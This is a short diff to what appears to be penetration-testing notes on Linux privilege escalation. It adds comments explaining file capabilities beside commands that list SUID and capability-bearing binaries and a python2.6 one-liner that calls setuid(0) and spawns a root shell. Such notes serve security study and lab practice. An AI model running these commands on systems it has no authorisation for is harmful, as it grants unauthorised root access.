@@ -219,6 +219,8 @@ find / -perm -u=s -type f 2>/dev/null
 ```shell
 getcap -r / 2>/dev/null
 # /usr/bin/python2.6 = cap_setuid+ep
+# think of +ep as permit everything
+# So, /usr/bin/python2.6 = cap_setuid+ep indicates that when the Python 2.6 interpreter is executed, it has the cap_setuid capability, which allows it to change its user ID, which we can change to 0 (root)
 
 /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 # now you are root
